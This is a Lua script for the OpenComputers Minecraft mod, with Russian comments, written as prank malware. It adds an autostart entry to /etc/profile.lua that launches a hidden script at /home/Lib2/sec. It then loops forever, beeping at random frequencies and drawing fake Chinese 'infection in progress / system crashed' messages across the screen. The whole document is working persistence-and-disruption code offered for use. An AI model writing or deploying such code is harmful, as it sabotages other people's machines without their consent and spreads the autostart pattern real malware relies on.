local component = require("component")
local gpu = component.gpu
local computer = require("computer")
local os = require("os")
local math = require("math")
-- Путь к файлу автозапуска
local fs = require("filesystem")

-- Путь к файлу автозапуска
local profile_path = "/etc/profile.lua"

-- Код для автозапуска
local autostart_code = [[

local fs = require("filesystem")
local shell = require("shell")

local script_path = "/home/Lib2/sec"

if fs.exists(script_path) then
    shell.execute("lua " .. script_path .. " &")
end
]]

-- Проверяем, существует ли файл /etc/profile
if not fs.exists(profile_path) then
    -- Создаем файл
    local file = io.open(profile_path, "w")
    file:write(autostart_code)
    file:close()

    print("Файл /etc/profile.lua создан и код добавлен.")
else
    -- Читаем содержимое файла
    local file = io.open(profile_path, "r")
    local content = file:read("*a")
    file:close()

    -- Проверяем, есть ли уже код в файле
    if not content:find("local script_path = \"/home/Lib2/sec\"") then
        -- Открываем файл в режиме добавления
        local file = io.open(profile_path, "a")
        file:write(autostart_code)
        file:close()

        print("Код успешно добавлен в /etc/profile.lua")
    else
        print("Код уже существует в /etc/profile.lua")
    end
end


-- Изменяем экран
local function modify_screen()
    -- Получаем разрешение экрана
    local width, height = gpu.getResolution()

    -- Рандомно выбираем позицию для китайского текста
    local x = math.random(1, width)
    local y = math.random(1, height)

    -- Покажем китайский текст
    gpu.set(x, y, "正在感染... 请稍等...")
    gpu.set(x, y + 1, "感染完成！系统崩溃！")

    -- Рандомно закрашиваем пиксели
    local px = math.random(1, width)
    local py = math.random(1, height)
    gpu.set(px, py, "X")
end

-- Функция для шума и изменений на экране
local function start_mischief()
    -- Начинаем выдавать звуки на случайных частотах
    while true do
        local freq = math.random(50, 1000)
        computer.beep(freq, 1)
        modify_screen()
        os.sleep(0.02)
    end
end

-- Запускаем процесс
start_mischief()
